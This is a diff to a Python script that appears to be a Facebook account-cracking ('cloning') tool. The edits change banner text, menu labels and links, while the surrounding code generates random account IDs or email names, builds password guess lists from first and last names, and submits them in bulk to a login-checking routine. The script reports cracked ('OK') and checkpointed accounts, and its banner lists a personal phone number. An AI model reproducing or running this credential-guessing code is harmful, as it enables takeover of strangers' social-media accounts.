@@ -285,7 +285,7 @@ logo=("""
 \x1b[38;5;83m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;85m MOHAMMAD JIBON
 \x1b[38;5;83m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;85m MOHAMMAD ZAHIRUL
 \x1b[38;5;83m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;85m+8801865544636
-\x1b[38;5;83m〘✧〙TOOLS     \x1b[38;5;222m➤   \x1b[38;5;85mRANDOM CLONE    \x1b[38;5;197m(FREE)
+\x1b[38;5;83m〘✧〙TOOLS     \x1b[38;5;222m➤   \x1b[38;5;85mFILE CLONING ✧ RANDOM CLONE
 \x1b[38;5;77m──────────────────────────────────────────────""")
 
 
@@ -338,7 +338,7 @@ def menu():
 	clear()
 	print ("\033[1;97m[1]\033[1;33m FILE CLONING ")
 	print ("\033[1;97m[2]\033[1;33m RANDOM CLONEING")
-	print ("\033[1;97m[3]\033[1;33m MY Facebook ID")
+	print ("\033[1;97m[3]\033[1;33m MY FACEBOOK ID")
 	ot = input('\n   \x1b[1;32m Choose option ➤ ')
 	if ot == '1':
 		os.system('xdg-open https://www.facebook.com/groups/1302330730660806/?ref=share&mibextid=NSMWBT')
@@ -373,7 +373,7 @@ def menu1():
 		os.system('xdg-open https://www.facebook.com/groups/1302330730660806/?ref=share&mibextid=NSMWBT')
 		rndm()
 	if ot == '3':
-		os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
+		os.system('xdg-open https://www.facebook.com/groups/1302330730660806/?ref=share&mibextid=NSMWBT')
 
 	else:
 		menu()
@@ -421,8 +421,8 @@ def rndm():
 		
 		ln = str(len(user))
 		print(50*'_')
-		print('[π] TOTAL IDS: '+ln)
-		print('[π] YOUR SIM CODE : '+cod)
+		print('[✧] TOTAL IDS: '+ln)
+		print('[✧] YOUR SIM CODE : '+cod)
 		print(50*'_')
 		for nhm in user:
 			uid = cod+nhm
@@ -431,7 +431,7 @@ def rndm():
 				pwx.append(psc)
 			saimon.submit(c,uid,pwx,ln)
 	print(50*'_')
-	print(' [π] Crack process has been completed')
+	print(' [✧] Crack process has been completed')
 	print(50*'_')
 	exit()
 
@@ -440,8 +440,8 @@ def mail():
 	print (f"{warna4}")
 	clear()
 	print(gyc)
-	first = input(' [π] Email FARST NAME ➤ ')
-	last = input(' [π] Email LAST NAME ➤  ')
+	first = input(' [✧] Email FARST NAME ➤ ')
+	last = input(' [✧] Email LAST NAME ➤  ')
 	print (f"{warna}")
 	clear()
 	print(gyc)
@@ -451,7 +451,7 @@ def mail():
 		doamin = ('@gmail.com')
 	elif '2' in mnum:
 		doamin = ('@yahoo.com')
-	limit = int(input('[π]EXAMPLE ➤ 3000 ✧ 5000 ✧ 15000 ✧ 20000\nCHOOSE CLONING LIMIT : '))
+	limit = int(input('[✧]EXAMPLE ➤ 3000 ✧ 5000 ✧ 15000 ✧ 20000\nCHOOSE CLONING LIMIT : '))
 	for nmbr in range(limit):
 		nm = ''.join(random.choice(string.digits) for _ in range(1,4))
 		user.append(nm)
@@ -459,7 +459,7 @@ def mail():
 		print(gyc)
 		clear()
 		ln = str(len(user))
-		print('[π]TOTAL IDS: '+ln)
+		print('[✧]TOTAL IDS: '+ln)
 		print ("ID BUBBLE PRINT HOBE EMAIL CLONEING AR KARONE")
 		print(50*'_')
 		print("")
@@ -468,7 +468,7 @@ def mail():
 			pwx = [first,first+last,'@@'+first+'123','@@'+first+'11','@@'+first+'1122',first+'1234',first+'1122',first+'11','@@'+first+'12345',first+'12345']
 			saimon.submit(c,uid,pwx,ln)
 	print(50*'_')
-	print(' [π] Crack process has been completed')
+	print(' [✧] Crack process has been completed')
 	print(50*'_')
 	exit()
 import random
@@ -625,7 +625,7 @@ def c(uid,pwx,ln):
             	continue
         loop+=1
         
-        #sys.stdout.write('\r%s   [SAIMON] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
+        #sys.stdout.write('\r%s   [JIBON] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
        # sys.stdout.flush()
     except requests.exceptions.ConnectionError:
         time.sleep(10)
@@ -634,7 +634,7 @@ def c(uid,pwx,ln):
 def crack_file():
 	
 	clear()
-	o = input('\x1b[1;97m [π] FILE NAME ➤ ')
+	o = input('\x1b[1;97m [✧] FILE NAME ➤ ')
 	print('')
 	try:lin = open(o).read().splitlines()
 	except:
